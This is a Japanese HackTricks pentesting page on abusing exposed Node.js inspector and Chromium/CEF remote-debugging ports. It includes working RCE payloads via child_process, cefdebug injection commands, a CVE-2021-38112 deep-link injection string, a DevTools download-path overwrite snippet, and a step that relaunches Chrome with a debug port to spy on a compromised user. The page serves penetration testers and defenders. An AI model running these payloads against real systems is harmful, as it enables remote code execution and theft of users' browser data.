# Node inspector/CEF debugの悪用

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)で**フォロー**する。
- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## 基本情報

[ドキュメントから](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect`スイッチで起動すると、Node.jsプロセスはデバッグクライアントを待機します。**デフォルト**では、ホストとポート**`127.0.0.1:9229`**で待機します。各プロセスには**一意のUUID**も割り当てられます。

Inspectorクライアントは、接続するためにホストアドレス、ポート、およびUUIDを知って指定する必要があります。完全なURLは`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`のようになります。

{% hint style="warning" %}
**デバッガーはNode.js実行環境への完全なアクセス権を持っている**ため、このポートに接続できる悪意のあるアクターは、Node.jsプロセスの代わりに任意のコードを実行できる可能性があります（**潜在的な特権昇格**）。
{% endhint %}

Inspectorを開始する方法はいくつかあります：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
以下のようなものが表示されると、検査されたプロセスが開始されます:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
プロセスは、**CEF** (**Chromium Embedded Framework**) ベースのものは、**デバッガ**を開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。ただし、これらは **NodeJS** **debug** セッションを許可する代わりに、ブラウザと通信するために [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) を使用します。これはブラウザを制御するためのインターフェースですが、直接的な RCE はありません。

デバッグされたブラウザを起動すると、次のようなものが表示されます：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### ブラウザ、WebSockets、および同一オリジンポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

WebサイトがWebブラウザで開かれると、ブラウザセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**固有のデバッガーセッションIDを取得するためには、最初にHTTP接続が必要**です。**同一オリジンポリシー**は、Webサイトが**このHTTP接続**を行うことを防ぎます。[**DNS再バインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)****に対する追加のセキュリティ対策として、Node.jsは接続のための**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを検証します。

{% hint style="info" %}
この**セキュリティ対策により、インスペクターを悪用してコードを実行する**ことが防がれます（これはSSRF脆弱性を悪用して行うことができる）。
{% endhint %}

### 実行中プロセスでのインスペクターの開始

実行中のnodejsプロセスに**シグナルSIGUSR1**を送信して、**デフォルトポートでインスペクターを開始**させることができます。ただし、十分な権限が必要なので、これによりプロセス内の情報に**特権アクセス**が付与される可能性がありますが、直接的な特権昇格は行われません。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
コンテナ内でこれは便利です。`--inspect`でプロセスを**シャットダウンして新しいプロセスを起動**することは**選択肢ではない**ため、**コンテナ**はプロセスとともに**終了**されます。
{% endhint %}

### インスペクター/デバッガーに接続

**Chromiumベースのブラウザ**に接続するには、Chromeの場合は`chrome://inspect`またはEdgeの場合は`edge://inspect`のURLにアクセスできます。構成ボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：

![](<../../.gitbook/assets/image (674).png>)

**コマンドライン**を使用して、デバッガー/インスペクターに接続できます：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
ツール[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)を使用すると、ローカルで実行中の**インスペクタ**を**見つけて**その中にコードを**注入**することができます。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
**NodeJS RCE exploits**は、ブラウザを[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)経由で接続している場合には機能しないことに注意してください（興味深いことを見つけるためにAPIをチェックする必要があります）。
{% endhint %}

## NodeJSデバッガー/インスペクターでのRCE

{% hint style="info" %}
もし[**ElectronのXSSからRCEを取得する方法**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)を探してここに来た場合は、このページをご確認ください。
{% endhint %}

Node **inspector**に**接続**できる場合に**RCE**を取得する一般的な方法のいくつかは、次のようなものを使用することです（Chrome DevToolsプロトコルへの接続では機能しないようです）:
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

APIはこちらで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
このセクションでは、このプロトコルを悪用するために人々が使用してきた興味深い事柄をリストアップします。

### ディープリンクを介したパラメーターインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)では、Rhino Securityが、CEFに基づくアプリケーションがシステムにカスタムURI（workspaces://）を登録し、そのURIを受け取り、そのURIから部分的に構築された構成でCEFベースのアプリケーションを起動していたことを発見しました。

URIパラメーターがURLデコードされ、CEFベースのアプリケーションを起動するために使用されていることが発見され、ユーザーがコマンドラインに`--gpu-launcher`フラグをインジェクトして任意の操作を実行できるようになっていました。

したがって、次のようなペイロード:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### ファイルの上書き

**ダウンロードされたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**で**アプリケーションのソースコード**を頻繁に使用されるように**上書き**するファイルをダウンロードします。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE と情報の流出

この投稿によると: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)、theriver から RCE を取得し、内部ページを流出させることが可能です。

### ポストエクスプロイテーション

実際の環境において、ユーザーの PC を侵害した後、Chrome/Chromium ベースのブラウザを使用している場合、Chrome プロセスをデバッグを有効にして起動し、デバッグポートをポートフォワードしてアクセスできるようにすることができます。これにより、被害者が Chrome で行うすべての操作を検査し、機密情報を盗むことができます。

ステルスな方法は、すべての Chrome プロセスを終了させ、次のようなものを呼び出すことです:
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考文献

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする。
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
